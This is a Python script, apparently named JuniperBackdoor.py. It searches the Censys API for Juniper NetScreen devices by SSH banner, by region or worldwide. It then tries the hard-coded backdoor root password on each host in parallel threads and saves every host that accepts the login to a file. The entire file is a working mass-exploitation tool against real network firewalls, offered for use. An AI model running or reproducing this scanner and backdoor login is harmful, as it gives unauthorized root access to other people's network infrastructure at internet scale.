from pexpect import pxssh
from Queue import Queue
import threading
import time
import re
import sys
import json
import requests
import math

user = "root"
passwd = "<<< %s(un='%s') = %u"

API_URL = "https://www.censys.io/api/v1"
UID = "YOUR UID"
SECRET = "YOUR SECRET"

PAGES = 50
cur_page = 1
thread_num = 20
over_num = 0
queue = Queue()

ip_OK = open("ip_OK.txt", "w")


class testTarget(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        global queue
        global ip_OK
        global over_num
        global thread_num
        is_over = False
        while not is_over:
            for i in range(5):
                if not queue.empty():
                    ip = queue.get()
                else:
                    is_over = True
                    over_num += 1
                    if over_num == thread_num:
                        ip_OK.close()
                        sys.exit()
                    break
                theSSH = connectSSH(ip, user, passwd)
                if theSSH:
                    before = theSSH.before
                    try:
                        theSSH.logout()
                    except:
                        pass
                    isval = re.search('Remote Management Console', before)
                    if isval:
                        print "%s is vul" % ip
                        ip_OK.write("%s\n" % ip)
                        ip_OK.flush()
                    else:
                        print "%s is not vul" % ip
            time.sleep(1)


def connectSSH(host, user, passwd):
    try:
        ssh = pxssh.pxssh()
        ssh.login(host, user, passwd, auto_prompt_reset=False)
        return ssh
    except Exception, e:
        print "%s is not vul" % host


def getIp(query, page):
    start_time = time.time()
    data = {
        "query": query,
        "page": page,
        "fields": ["ip"]
    }
    try:
        res = requests.post(
            API_URL + "/search/ipv4", data=json.dumps(data), auth=(
                UID, SECRET))
    except:
        pass
    else:
        try:
            results = res.json()
        except:
            pass
        else:
            if res.status_code != 200:
                print "error occurred: %s" % results["error"]
                sys.exit(1)
            else:
                result_iter = iter(results["results"])
                for result in result_iter:
                    queue.put(result["ip"])


def test():
    for i in range(thread_num):
        t = testTarget()
        t.start()

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print """
usage: 
    using python JuniperBackdoor.py [region] to scan the hosts
    in the region you set
    
    using python JuniperBackdoor.py ALL to scan the hole world
        """
        sys.exit()
    else:
        region = sys.argv[1]
        if region == "ALL":
            query = "22.ssh.banner.software_version:NetScreen"
        elif region == "china":
            query = "22.ssh.banner.software_version:NetScreen AND \
            location.country:%s" % region
        else:
            query = "22.ssh.banner.software_version:NetScreen AND \
            location.province:%s" % region
    getIp(query, cur_page)
    if not queue.empty():
        test()
    while queue.qsize() > 0:
        if cur_page <= PAGES:
            getIp(query, cur_page)
            cur_page += 1
        time.sleep(0.1)
